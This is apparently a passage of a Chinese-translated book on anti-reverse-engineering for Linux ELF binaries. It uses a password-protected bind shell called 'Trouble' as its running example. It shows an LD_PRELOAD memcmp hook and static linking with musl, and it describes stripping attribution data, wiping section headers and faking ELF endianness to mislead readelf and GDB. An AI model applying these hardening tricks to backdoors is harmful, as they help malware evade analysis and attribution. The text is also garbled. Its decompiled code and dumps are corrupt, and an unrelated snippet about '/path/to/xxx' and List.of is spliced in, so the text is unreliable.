[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[ ] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x00400ad0]> pdf @ sym.btea_encrypt
/ (fcn) sym.btea_encrypt 800
```

反反编译后的代码比原始代码复杂得多。

### 反编译后的 `-O3 -funroll-loops` `btea_encrypt()`

```c
int btea_encrypt(int arg0, int arg1, int arg2) {

rsi = arg1;

rdi = arg0;

stack[2047] = r15;

stack[2046] = r14;

stack[2045] = r13;

stack[2044] = r12;

stack[2043] = rbp;

rbp = arg2;

rax = 0x34 / rsi;

stack[2042] = rbx;

rsp = rsp - 0x8 - 0x8 - 0x8 - 0x8;

if (rax != 0xffffffffffff) {

r12 = rsi + 0xffffffffffffffff;

r11 = 0x0;

stack[2042] = rsi + 0xffffffffffffffff;

do {

nr11 = r11 - 0x61c88647;

r2 = r11 >> 0x2;

rax = *(int32_t *)stack[2042];

if (r12 > 0x0) {

if (var_-8 > 0x3) {

rdx = *(int32_t *)rdi;

rbx = stack[2042];

r10 = rdi + 0x4;

r13 = 0x1;

rcx = 0x0;

do {

r9 = *(int32_t *)r10;

r14 = rsi ^ 0x8;

r10 = r10 + 0x8;

rcx = rcx + 0x2;

r8 = (r11 ^ r9) + ((int32_t *) (rbp) + (r14 & 0x3) * 0x4)) ^

r15 = rsi ^ r13;

r13 = r13 + 0x2;

r8 = ((rax >> 0x5) ^ 0x4) * (r9 >> 0x3 ^ rax << 0x4) ^

br8) + rdx;

rdx = *(int32_t *) (r10 + 0xffffffffffffffff);

*(int32_t *)(r10 + 0xffffffffffffffff) = r8;

rax = ((rax << 0x4) ^ rdx) + (r8 >> 5)

*(int32_t *)(r10 + 0xffffffffffffffff) = r8;

rax = ((rax << 0x4) ^ rdx) + (r8 >> 5)

*(int32_t *)(rbp + (r15 & 0x3) ^ 0x4) ^

r8 + rdx;

*(int32_t *)(r10 + 0xffffffffffffffff) = rax;

} while (r13 < rbx);

} else {

rcx = 0;

r14 = rcx + 1;

r8 = *(int32_t *)(di + r14);

r9 = !rcx & 0x2;

if (r9 == 0x0) {

r8 = *(int32_t *)(di + (rcx + 2) ^ 0x4);

rcx = (r11 ^ r8) + (int32_t *)(rbp + (rcx & 0x3) ^ 0x4) ^

rax >> 5) + r8 << 2 +

(rax >> 3 ^ rax << 4);

rax = *(int32_t *)(di + r14);

rax = rax + rdx;

rcx = rcx + 2;

*(int32_t *)r10 = r15;

r10 = *(int32_t *)(di + rcx ^ 0x4);

rax = (r11 ^ r8) + *(int32_t *)(rbp + r8 + 0x4) ^

r15) ^ (r15 >> 5 ^ r10 << 2) + (r10 >> 3 ^

r15 << 4) + *(int32_t *)r9;

} while (rcx < r12);

} else {

r10 = di + rdx * 0x4;

rbx = *(int32_t *) *(di + (rcx ^ 1) * 0x4);

r9 = di + (rcx ^ 1) * 0x4;

r8 = (rcx ^ 1 ^ rsi);

r15 = (r11 ^ rbx) + *(int32_t *) *(rbp + ((rsi ^ rdx) * 0x3) ^

0x4) ^ rax) ^ (rax >> 5 ^ rbx << 2) +

(rbx) << 0x3 ^ rax << 4) + *(int32_t *)r10;

rax = rdx;

rcx = rdx + 2;

*(int32_t *)r10 = r15;

r10 = *(int32_t *) *(di + rax * 0x4);

rax = ((r11 ^ r10) + *(int32_t *) *(rbp + r8 * 0x4) ^

r15) ^ (r15 >> 5 ^ r10 << 2) + (r10 >> 3 ^

r15 << 4) + *(int32_t *)r9;

} while (rcx < r12);

nr13 = r12;

r10 = *(int32_t *)stack[2042];

}else {

r10 = rax;

r13 = 0;

r15 = *(int32_t *)di;

rax = rax >> 0x5;

rsi = *(int32_t *) *(rbp + ((r13 & 0x3) * 0x4);

rsi = rsi ^ rax;

rax = rax << 0x4;

*(int32_t *)stack[2042] = (rsi + (r11 ^ r15) ^

r15 >> 3 ^ rax)) + r10;

} while (r11 != var_-12);

return rax;
```

考虑一下理解 `btea_encrypt()` 需要完成的工作。使用 `-O3 -funroll-loops` 几乎翻倍了函数的体积。而且循环更多。仅仅使用优化标志就增加了逆向工程师的工作量。在之前的章节中，你学习了多种提取 `s_password` 内容的方法。然而，你也学会了如何使用编译器选项来隐藏 `s_password` 免受窥探。

### `-static`

| Num | Value | Type | Bind | Name |
|---|---|---|---|---|
| 0 | 0000000000000000 | NOTYPE | LOCAL | UND |
| 1 | 0000000000000000 | NOTYPE | WEAK | `_ITM_deregisterTable` |
| 2 | 0000000000000000 | FUNC | GLOBAL | `_stack_chk_fail@GLIBC_2.2.4 (2)` |
| 3 | 0000000000000000 | FUNC | GLOBAL | `dup2@GLIBC_2.2.5 (3)` |
| 4 | 0000000000000000 | FUNC | GLOBAL | `close@GLIBC_2.2.5 (3)` |
| 5 | 0000000000000000 | FUNC | GLOBAL | `read@GLIBC_2.2.5 (3)` |
| 6 | 0000000000000000 | FUNC | GLOBAL | `_libc_start_main@GLIBC_2.2.5 (3)` |
| 7 | 0000000000000000 | FUNC | GLOBAL | `memcmp@GLIBC_2.2.5 (3)` |
| 8 | 0000000000000000 | FUNC | GLOBAL | `execve@GLIBC_2.2.5 (3)` |
| 9 | 0000000000000000 | NOTYPE | WEAK | `__gmem_start_` |
| 10 | 0000000000000000 | FUNC | GLOBAL | `listen@GLIBC_2.2.5 (3)` |
| 11 | 0000000000000000 | FUNC | GLOBAL | `bind@GLIBC_2.2.5 (3)` |
| 12 | 0000000000000000 | FUNC | GLOBAL | `perror@GLIBC_2.2.5 (3)` |
| 13 | 0000000000000000 | NOTYPE | WEAK | `_Jv_Classes` |
| 14 | 0000000000000000 | FUNC | GLOBAL | `accept@GLIBC_2.2.5 (3)` |
| 15 | 0000000000000000 | FUNC | GLOBAL | `fwrite@GLIBC_2.2.5 (3)` |
| 16 | 0000000000000000 | NOTYPE | WEAK | `_ITM_register_Table` |
| 17 | 0000000000000000 | FUNC | GLOBAL | `fork@GLIBC_2.2.5 (3)` |
| 18 | 0000000000000000 | FUNC | GLOBAL | `socket@GLIBC_2.2.5 (3)` |
| 19 | 0000000000000620 | NOTYPE | GLOBAL | `_data` |
| 20 | 0000000000000620 | NOTYPE | GLOBAL | `_text_start` |
| 21 | 0000000000000062b | FUNC | GLOBAL | `_end` |
| 22 | 0000000000000620 | NOTYPE | WEAK | `_bss_start` |
| 23 | 0000000000000620 | NOTYPE | WEAK | `_rodata_start` |
| 24 | 0000000000000620 | NOTYPE | WEAK | `_dynamic_start` |
| 25 | 0000000000000620 | NOTYPE | WEAK | `_init_array` |
| 26 | 0000000000000620 | NOTYPE | WEAK | `_fini_array` |
| 27 | 0000000000000620 | NOTYPE | WEAK | `_start_array` |
| 28 | 0000000000000620 | NOTYPE | WEAK | `_exit_array` |
| 29 | 0000000000000620 | NOTYPE | WEAK | `_rel_array` |
| 30 | 0000000000000620 | NOTYPE | WEAK | `_rel_plt` |

### 运行时解析函数

重要的是 Trouble 在运行时解析外部依赖。无论如何，找到需要加载的函数的方法是查看二进制文件信息。

```
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build readelf --dyn-syms trouble
```

```
0000002040 R_X86_64_JUMP_SLO 0000000000000000 memcmp@GLIBC_2.25 + +

0000002048 R_X86_64_JUMP_SLO 0000000000000000 execve@GLIBC_2.25 + +

0000002050 R_X86_64_JUMP_SLO 0000000000000000 listen@GLIBC_2.25 + +

0000002058 R_X86_64_JUMP_SLO 0000000000000000 bind@GLIBC_2.25 + +

0000002060 R_X86_64_JUMP_SLO 0000000000000000 perror@GLIBC_2.25 + +
```



```
0000002068 R_X86_64_JUMP_SLO 0000000000000000 accept@GLIBC_2.25 + +
0000002070 R_X86_64_JUMP_SLO 0000000000000000 fwrite@GLIBC_2.25 + +
0000002078 R_X86_64_JUMP_SLO 0000000000000000 fork@GLIBC_2.25 + +
0000002080 R_X86_64_JUMP_SLO 0000000000000000 socket@GLIBC_2.25 + +
```

观察`memcmp`，其中一个函数需要被加载，在 GDB 中启动 Trouble 之前和之后。

### 在 libc.so 加载之前检查 memcmp

```
albin-ubuntu@ubuntu:~antire_book/chap_2_compiler/trouble/build$ gdb .trouble

GNU gdb (7.11-1~ubuntu16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPL v3 or later <http://gnu.org/licenses/gpl.html>
此软件是免费的：您可以自由地更改和分发它。
在法律允许的范围内，不提供任何保证。输入 "show copying"
和 "show warranty" 查看详情。
此 GDB 配置为 "x86_64-linux-gnu"。
输入 "show configuration" 查看配置详情。
如需获取错误报告说明，请参阅：
<http://www.gnu.org/software/gdb/bugs/>。
在线查找 GDB 手册或其他文档资源：
<http://www.gnu.org/software/gdb/documentation/>。
如需帮助，请输入 "help"。
输入 "apropos word" 搜索与 "word" 相关的命令。
从 ./trouble... 读取符号（未找到调试符号）...完成。

(gdb) info address memcmp
符号 "memcmp" 位于 0x04009a，在一个未编译编译调试信息的函数中。

(gdb) disas memcmp
函数 memcmp@plt 的汇编转储：
000000000000409a 040 <+>:    jmpq *0x60219a(%rip)      # 0x602040
000000000000409a 0a6 <+>:    pushq $0x5
000000000000409b 0bd <+11>:    jmp 0x4009a
```

在上面的 GDB 输出中，我执行了两个命令`info address memcmp`和`disas memcmp`。这两个命令的结果都指向 PLT 表中的地址`0x4009a`。然而，如果在 Trouble 开始执行后重新执行这些命令，你会发现`memcmp()`现在指向`libc.so`。

### 在 libc.so 加载后检查 memcmp

```
(gdb) info address memcmp
符号 "memcmp" 位于 0xffffff7a9c180
(gdb) dis memcmp
函数 memcmp 的汇编代码转储：
0x00000000ffff7a9c180 <+0>:  mov     0x334ce9(%rip),rdx  # 0xffffff7dd00
0x00000000ffff7a9c187 <+7>:  testl   0x200,0x80(%rip)
0x00000000ffff7a9c191 <+17>:  je      0xffffff7a9c1b  <memcmp+27>
0x00000000ffff7a9c193 <+19>:  mov     0x26(%rip),rax  # 0xffffff7a9c26
0x00000000ffff7a9c19a <+26>:  retq
0x00000000ffff7a9c19b <+27>:  testl   0x800000,0x80(%rd)
0x00000000ffff7a9c1a5 <+37>:  je      0xffffff7a9c1af  <memcmp+47>
0x00000000ffff7a9c1a7 <+39>:  lea     0x39(%rip),rax
0xfdab2(%rip),rax  # <__memcmp_sse4_1>
0x00000000ffff7a9c1ae <+46>:  retq
0x00000000ffff7a9c1af <+47>:  lea     0xe23a(%rip),rax  # <__memcmp_sse3>
0x00000000ffff7a9c1b6 <+54>:  retq
```

汇编转储结束

`libc.so`已转储到内存中，Trouble 现在指向共享对象中的`memcmp()`实现。

理性的人可能会认为`memcmp()`用于比较用户提供的密码和嵌入在 Trouble 中的密码。事实上，你可以使用名为`ltrace`的工具来确认这一点，该工具会显示程序运行时发生的所有动态库调用。img/fdf1e4bfff39dc5a8eb00fa2359_0.png

### 在 Trouble 上使用 ltrace

```
lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ ltrace -f ./trouble
libc_start_main(0x400c2f, 1, 0xff1978d48, 0x400e60) ...
socket(2, 1, 6) = 3
htonl(0, 1, 6, 0xff7b2aeab7) = 0
htons(2, 1, 6, 0xff7b2aeab7) = 0xf604
bind(3, 0xff1978c20, 16) = 0
listen(3, 5, 16, 0xff7b2aea507) = 0
accept(3, 0, 0, 0xff7b2aea627) = 4
fork() = 2142
close(4) ... = 0
read(4) ... = 0
accept(3, 0, 0, 0xff7b2add10) ... "10000000000000000000000000000000", 33)) = 33
memcmp(0x400f00, 0xff1978c30, 32, 0xff7b2ad9680) = 3
close(4)
exited (status 1)
SIGCHLD (Child exited)
```

在此跟踪的末尾，你可以看到对`memcmp()`的调用，第一个参数是熟悉的地址`0x400f00`（即`s_password`）。`ltrace`能够通过使用`ptrace`在加载的函数开头插入断点来记录这些内容。在后面的章节中，你将学习如何防止使用`ptrace`的程序操作 Trouble。但在本节中只需要理解库跟踪对于 Trouble 是一个真实的问题。

### LD_PRELOAD

我提到通过`ptrace`进行库跟踪是后续章节要学习的方法。然而，还有另一种方法输出`memcmp()`的参数。通过使用动态链接器 LD_PRELOAD，你可以在`libc.so`等共享对象之前加载自己的库。这意味着你可以引入自己的代码来处理`memcmp()`，并且执行的函数将替代`libc.so`的函数。

> ²⁶https://www.kernel.org/docs/ols2007/ols2007v1-pages-41-52.pdf

> ²⁷man ld.so

我写了代码来证明这一点。可以在第二章目录下的`ld_preload`中找到。该目录包含两个文件：`CMakeLists.txt`和`catch_memcmp.c`。

`chap_2_compiler/ld_preload/CMakeLists.txt`

```
project(catch_memcmp.so C)
cmake_minimum_required(VERSION 3.0)
```

```
set(CMAKE_FLAGS "-Wall -Wextra -Wshadow -fPIC -shared -std=gnull")
add_executable(${PROJECT_NAME} src/catch_memcmp.c)
target_link_libraries(${PROJECT_NAME} dl)
```

`chap_2_compiler/ld_preload/src/catch_memcmp.c`

```
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>

/**
 * 该程序配合 LD_PRELOAD 使用时，会将值
 * 输出到真实的 memcmp。用法：LD_PRELOAD=./catch_memcmp.so ./trouble
 */
int memcmp(const void *s1, const void *s2, size_t n) {
    static int (*original_memcmp)(const void *, const void *, size_t) = NULL;
    if (!original_memcmp) {
        original_memcmp = dlsym(RTLD_NEXT, "memcmp");
    }
    printf("memcmp(%p, %p, %zu)\n", s1, s2, n);
    return original_memcmp(s1, s2, n);
}
```

## 第 2 章：编译器选项

`albino-lobster@ubuntu:-/antire_book/chap_2_compiler/ld_preload/build$ LD_PRELOAD=/etc/catch_memcmp.so ../trouble/build/trouble`

使用 Trouble，尝试用 netcat 连接到端口 1270 上的 bind shell。

你应该输入一个 32 字节的字符串并按回车。例如：

向 Trouble 传递一个错误的密码

```
albino-lobster@ubuntu:-$ nc 127.0.0.1 1270
loooooooooooooooooooooooool
albino-lobster@ubuntu:-$
```

由于你提供了错误的密码，Trouble 应该会立即终止 netcat 连接。但是，如果你回看运行 Trouble 的终端，你会看到类似的内容：

```
catch_memcmp.so reveals s_password
albino-lobster@ubuntu:-/antire_book/chap_2_compiler/ld_preload/build$ LD_PRELOAD=/etc/catch_memcmp.so ../trouble/build/trouble
memcmp(T0GOUE26TW0Kb19eXUbt1FKCR@Jn, loooooooooooooooooooooooooooo, 32)
```

你可以清楚地看到`catch_memcmp.so`打印出了`s_password`和我在 netcat 连接中尝试使用的伪字符串。

### 使用 musl

如果你想编写一个真正加固的二进制文件，最好是不信任系统上的所有共享库。根据 GCC 文档，`-static`“防止与共享库链接”²⁸。然而，许多主流 Linux 发行版自带的 glibc 实际上设计初衷并不是为了静态链接的。当我们进行静态链接时，某些库的功能会损坏，并且会让我们的二进制文件体积显著增大。事实是，glibc 就不应该用于静态链接。幸运的是，还有其他旨在用于静态链接的库²²⁹

> ²⁸https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html

> ²²⁹http://www.etalabs.net/compare_libcs.html

- 1. diet libc³⁰
- 2. uClibc³¹
- 3. musl libc³²

在本书的剩余部分，我们将使用 musl（读音为“muscle”）libc。我选择 musl 是因为它正在被活跃维护，在 Ubuntu 上很容易安装，并且与 CMake 配合良好。

在 Ubuntu 上安装 musl，使用 apt-get：

安装 musl-lobster@ubuntu 16.04

```
albino-lobster@ubuntu:~/antire_book$ sudo apt-get install musl-tools musl-dev
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following additional packages will be installed:
musl
Recommended packages:
linux-musl-dev
The following NEW packages will be installed:
musl-dev musl-tools
0 upgraded, 3 installed, 0 to remove and 45 not upgraded
Need to get 0/768 kB of archives.
After this operation, 3,568 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
Selecting previously unselected package:amd64.
(Reading database ... 242454 files and directories currently installed)
Preparing to unpack .../musl_1.1.9-amd64.deb
Unpacking musl:amd64 (1.1.9-1) ...
Selecting previously unselected package musl-dev.
Preparing to unpack .../musl-dev_1.1.9-amd64.deb
Unpacking musl-dev (1.1.9-1) ...
Selecting previously unselected package musl-tools.
Preparing to unpack .../musl-tools_1.1.9-amd64.deb
Unpacking musl-tools (1.1.9-1) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up musl:amd64 (1.1.9-1) ...
```

> ³⁰https://www.fefe.de/dietlibc/

> ³¹https://uclibc.org/

> ³²https://www.musl-libc.org/

Setting up musl-dev (1.1.9-1) ...

Setting up musl-tools (1.1.9-1) ...

要更新 *Trouble* 以使用`-static`标志，你只需更新编译器标志即可。

```
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -s -fvisibility=hidden -O3 -funroll-loops -static -std=gnu1")
```

此外，你还需要告诉 CMake 使用不同的编译器。将以下行放在`CMAKE_C_FLAGS`行的正上方：

```
set(CMAKE_C_COMPILER musl-gcc)
```

大搞定！现在当你编译 *Trouble* 时，你将使用 musl libc 而不是 glibc。

### 体积很重要

我想看看使用 glibc 静态链接和使用 musl libc 静态链接之间的尺寸差异。我分别使用这两个库编译了 *Trouble*，结果非常有说服力：

glibc 版本的 *Trouble* 使用 -l

```
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ ls -l ../trouble
-rw-r--r-- 1 albino-lobster albino-lobster 840 May 10 17:32 ./trouble
```

musl libc 版本的 *Trouble* 使用 -l

```
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ ls -l ../trouble
-rw-r--r-- 1 albino-lobster albino-lobster 95 May 10 17:44 ./trouble
```

你看，840kb 对比 95kb。这是一个巨大的差异！你可能会问我如何知道我不再使用动态库了？一种方法是查看动态段（dynamic section）。使用 glibc 的 Trouble 动态段



```
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf -d ./trouble
Dynamic section at offset 0x128 contains 24 entries:

| Tag | Name | Value |
| :--- | :--- | :--- |
| Shared Library | libc.so.6 | 0x000000000000001 | 0x4009d0 |
| INIT | | 0x00000000000000c | 0x400ed4 |
| FINIT | | 0x00000000000000d | 0x601e10 |
| INIT_ARRAY | | 0x000000000000019 | |
| INIT_RAYS | | 0x00000000000001b | 8 |
| INIT_ARRAY | | 0x00000000000000a | 0x601e18 |
| INIT_RAYS | | 0x00000000000001c | 8 |
| GNU_HASH | | 0x000000000000ffffff | 0x400298 |
| STRTAB | | 0x000000000000005 | 0x400648 |
| SYMTAB | | 0x000000000000006 | 0x400300 |
| STSZ | | 0x00000000000000a | 350 |
| SYMENT | | 0x00000000000000b | 24 |
| DEBUG | | 0x000000000000015 | 0 |
| PLTGOT | | 0x000000000000003 | 0x602000 |
| PTRELSZ | | 0x000000000000002 | 384 |
| PTREL | RELA | 0x0000000000000014 | |
| JMPREL | | 0x0000000000000017 | 0x400850 |
| RELA | | 0x0000000000000007 | 0x400820 |
| RELASZ | | 0x0000000000000008 | 48 |
| RELENT | | 0x0000000000000009 | 24 |
| VER_NEEDED | | 0x000000000006ffff | 0x4007f0 |
| VER_NEED | | 0x0000000000006ffffff | 1 |
| VERSYM | | 0x000000000000ffff0 | 0x4007a6 |
| NULL | | 0x0000000000000000 | 0 |
```

第一行显示需要共享库 `libc.so.6`。然而，使用 `musl` 编译时动态段根本不存在。

### 使用 musl libc 的 Trouble 动态段

```
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf -d ./trouble
```

该文件中没有动态段。

查看二进制文件外部依赖的另一种方法是使用 `ldd`。

对 glibc 使用 Trouble：

```
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ ldd .trouble
linux-vdso.so.1 => (0x00007ffca230a000)
libc.so.6 => /lib/x86_64-gnu/libc.so.6 (0x00007f2870c05000)
/lib64/ld-linux-x86-64.so.2 (0x000055bd18700)
```

对 musl libc 使用 Trouble：

```
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ ldd .trouble
```

你可以看到切换到 `musl` 之前 Trouble 有一些依赖项。我们停止使用 `LD_PRELOAD`！

## 第 3 章：文件黑客

本章全部关于修改 ELF 结构。了解这些中的一些数据对本章会有帮助。我之所以写这本关于 ELF 的入门书籍是因为已经有了许多描述。如果你想更深入了解，可以查看：

1. https://en.wikipedia.org/wiki/Executable_and_Format
2. http://wiki.osdev.org/

### Strip 工具

使用 `-s` 选项移除 `.symtab`。存在一个名为 `strip` 的编译后工具执行相同的操作。但是，`strip` 工具可以从二进制文件中移除更多内容。“remove sections” 是什么意思？查看 Trouble 版本的节表。

### Trouble 的节表

```
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble$ readelf -S ./trouble
有 13 个节头，起始于偏移 0x2218：

| Nr | Name | Type | Flags | Info | Align |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 0 | NULL | 0x0000000000000000 | 0x0000000000000000 | 0 | 0 |
| 1 | .init | 0x0000000000000003 | 0x0000000000001200 | PROGBITS | AX | 0x1200 |
| 2 | .text | 0x000000000000126f | 0x0000000000001300 | PROGBITS | AX | 0x1300 |
| 3 | .finit | 0x0000000000000000 | 0x000000000000139f | PROGBITS | AX | 1 | 0x139f |
| 4 | .rodata | 0x0000000000000858 | 0x00000000000013c0 | PROGBITS | A | 0 | 0x13c0 |
| 5 | .eh_frame | 0x0000000000000004 | 0x0000000000001c18 | PROGBITS | A | 0 | 0x1c18 |
| 6 | .init_array | 0x0000000000000008 | 0x0000000000601fe8 | INIT_ARRAY | WA | 0 | 0x1fe8 |
| 7 | .fini_array | 0x0000000000000008 | 0x0000000000601ff0 | FINI_ARRAY | WA | 0 | 0x1ff0 |
| 8 | .jcr | 0x0000000000000008 | 0x0000000000601f88 | PROGBITS | WA | 0 | 0x1f88 |
| 9 | .data | 0x0000000000000160 | 0x0000000000602000 | PROGBITS | WA | 0 | 0x064 |
| 10 | .bss | 0x0000000000000320 | NOBITS | 0x0000000000602180 | WA | 0 | 0x2160 |
| 11 | .comment | 0x0000000000000058 | PROGBITS | 0x0000000000000001 | MS | 0 | 0x2160 |
| 12 | .shhtrap | 0x0000000000000060 | STRTAT | 0x0000000000000000 | | 0 | 0x21b8 | 1 |
```

## 第 3 章：文件格式黑客

### .comment 的内容

```
albino-lobster@ubuntu:-/antire_book/chap_3_format_hacks/trouble/build$ objdump -s --section .comment /trouble
```

```
./trouble          file format elf64-x86-64
```

```
Contents of section .comment:
0000 4743a33a 20285562 75e6475 20352e34 GCC (Ubuntu 5.4
0010 22e302d36 752756e 747531fe 31362e30 .0-ubuntu1-16.0
0020 342e3229 20352e34 22e30232 30316360 4.2) 5.4.0 20160
0030 63033900 4743433a 20285562 75e6475 609.GCC:(Ubuntu
0040 20342e39 22e32d31 37756275 6e747531 4.9.2-17ubuntu1
0050 2902342e 39ee200 ) 4.9.2.
```

这些看起来像是某种版本字符串？为了更清晰地阅读，你可以使用 `strings` 工具。

使用 `strings` 获取 `.comment` 的输出：

```
albino-lobster@ubuntu:-/antire_book/chap_3_format_hacks/trouble/build$ strings -a -t /trouble | grep GCC
GCC: (Ubuntu 5.4.0-6ubuntu1-16.04.2) 5.4.0 20160609
GCC: (Ubuntu 4.9.2-17ubuntu1) 4.9.2
```

第一个字符串是 Ubuntu 16.04 上的 GCC 版本。我不完全确定第二个字符串到底是什么。无论如何！我们在二进制文件中不需要也不想要这些信息。虽然这些信息不会帮助逆向工程师拆解我们的二进制文件，但它可以帮助各种归因技术。所以，让我们把它删掉吧。`strip` 可以通过 `-R` 参数移除节。

### 从 Trouble 中剥离 .comment

```
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -S /trouble
```

有 12 个节表头，从偏移量 0x21b8 开始：

节表头：

| Nr | Name | Type | Address | Offset | Size | Flags | Link | Align |
|---|---|---|---|---|---|---|---|---|
| [ 0 ] | | NULL | 0000000000000000 | 0000000000000000 | 0 | 0 | 00000000 |
| [ 1 ] | .init | PROBITS | 0000000000401200 | 0 | 1 | 00000120 |
| [ 2 ] | .text | | 0000000000401300 | AX | 0 | 0 | 16 |
| | | | | 000000000000126f | 0000000000000000 | AX | 0 | 0 |
| [ 3 ] | .fini | PROBITS | 000000000040139f | 0 | 0001139f |
| | | | | 0000000000000003 | 0000000000000000 | AX | 0 | 0 |
| [ 4 ] | .rodata | PROBITS | 00000000004013c0 | 0 | 00013c0 |
| | | | | 0000000000000858 | A | 0 | 64 |
| [ 5 ] | .eh_frame | PROBITS | 0000000000401c18 | 0 | 0001c18 |
| | | | | 0000000000000004 | A | 0 | 4 |
| [ 6 ] | .init_array | INIT_ARRAY | 0000000000601fe8 | 0 | 0001fe8 |
| | | | | 0000000000000008 | WA | 0 | 8 |
| [ 7 ] | .fini_array | FINI_ARRAY | 0000000000601ff0 | 0 | 0001ff0 |
| | | | | 0000000000000008 | WA | 0 | 8 |
| [ 8 ] | .jcr | PROBITS | 0000000000601ff8 | 0 | 0001ff8 |
| | | | | 0000000000000008 | WA | 0 | 8 |
| [ 9 ] | .data | | 0000000000602000 | 0 | 64 |
| | | | | 0000000000000160 | WA | 0 | 64 |
| [ 10] | .bss | NOBITS | 0000000000602180 | 0 | 0002160 |
| | | | | 0000000000000320 | WA | 0 | 64 |
| [ 11] | .shstrtab | STRTAB | 0000000000000000 | 0 | 0002160 |
| | | | | 0000000000000570 | 0 | 1 |

标志位说明：W (write), A (alloc), X (execute), M (merge), S (strings), L (link), G (group), E (exclude), p (processor specific)

从上面可以看到，头文件中没有移除 `.comment`，但下一个项 `.shstrtab` 移动到了 `.comment` 原本的位置。

你不想在每次构建后手动执行 `strip -R`。那很麻烦。幸运的是，CMake 支持这种功能。如果你在 Trouble 的 `CMakeLists.txt` 中添加以下命令，每次编译都会移除 `.comment`：

### 在每次编译时剥离 .comment

```cmake
add_custom_command(TARGET ${PROJECT_NAME}
  POST_BUILD
  COMMAND strip -R .comment ${CMAKE_CURRENT_BINARY_DIR})
```

### 移除节头

在上一节中，你查看的是节表头。节表头对于逆向工程师很有用，因为它将二进制文件的地址空间划分为特定的块。然而，执行实际上不需要节头。你没没错，节表是不需要的！你可以完全移除它。别听我的，自己试试吧。看看 Trouble 的 ELF 头。

### Trouble 的 ELF 头

```
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -h trouble
ELF Header:
Magic: 7f 45 4c 46 02 01 00 00 00 00 00 00
Class: ELF64
Data: 2's complement, little endian
Version: 1 (current)
OS/ABI: UNIX - System V
ABI Version: 0
Type: EXEC (Executable file)
Machine: Advanced Micro Devices X86-64
Version: 0x1
Entry point address: 0x402f2
Start of program headers: 64 (bytes into file)
Start of section headers: 0x32 (bytes into file)
Flags: 0x0
```

Size of this header: 64 (bytes)

Size of program headers: 56 (bytes)

Number of program headers: 4

Size of section headers: 64 (bytes)

Number of section headers: 12

Section header string table index: 11

ELF 头中有四个变量用于查找、解析和显示节头：

1. Start of section headers
2. Size of section headers
3. Number of section headers
4. Section header string table index

如果你将这些值设为零，那么定位或解析表将是不可能的。尝试用十六进制编辑器（如 `ghex`）打开 Trouble，并将字节 `0x28`、`0x29`、`0x3a`、`0x3c` 和 `0x3e` 置为零。之后，Trouble 的 ELF 头应该像这样：

### 更新后的 ELF 头



进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`。

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```



从`readelf`的输出可以看出，`Trouble`的`EI_DATA`字节（“magic”数组中的第 6 个字节）被设置为 1，这意味着是`ELFDATA2LSB`或“补码，小端序”。让我们使用`dd`将其改为 2，即“补码，大端序”。使用以下命令：

## 使用 dd 修改 EI_DATA 字节

```
printf '\x02' | dd conv=notrunc of=trouble bs=1 seek=5
1+0 records in
1+0 records out
1 byte copied, 7.6279e-05 s, instead of seek=6.
```

注意`seek`从 0 开始，所以使用`seek=5`。现在来看看`readelf`对`Trouble`有什么说。

## 修改 Trouble 的 EI_DATA 标志后的 readelf

```
albino@lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -a ./trouble
ELF Header:
Magic: 7f 45 46 46 02 02 01 00 00 00 00 00 00 00 00
Class: ELF64
Data: 2's complement, big endian
Version: 1 (current)
OS/ABI: UNIX - System V
ABI Version: 0
Type: <unknown>: 200
Machine: <unknown>: 0x3e0
Version: 0x1000000
Entry point address: 0xf202400000000000
Start of program headers: 461168618427387004 (bytes into file)
Start of section headers: -517885850964935744 (bytes into file)
Flags: 0x0
Size of this header: 16384 (bytes)
Size of program headers: 14336 (bytes)
Number of program headers: 1024
Size of section headers: 16384 (bytes)
Number of section headers: 3072
Section string table index: 2816
readelf: Warning: The e_psize field in the ELF header is larger than the size of ELF section header
readelf: Error: Reading 0x3000000 bytes extends end of file for section headers
readelf: Error: Section headers are not available!
readelf: Warning: The e_psize field in the ELF header is larger than the size of ELF program header
readelf: Error: Reading 0xe0000 bytes extends end of file for program headers
readelf: Warning: The e_psize field in the ELF header is larger than the size of ELF program header
readelf: Error: Reading 0xe0000 bytes extends past end of file for program headers
```

糟糕！这完全搞砸了，不是吗？看来`readelf`相信了`Trouble`中的字节序谎言。但我怀疑 GDB 会被骗吗？

## 用字节序谎言欺骗 GDB

```
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble$ gdb ./trouble
Gnu gdb (Ubuntu 7.11.1-0ubuntu16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3; GNU GPL 3 or later <http://www.gnu.org/licenses/gpl.html>
This is free software: you are free to copy and redistribute it.
There is NO WARRANTY, to the extent permitted by law. Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu". Type "show configuration" for details.
For bug reporting, please see: <http://www.gnu.org/software/gdb/bugs/>.
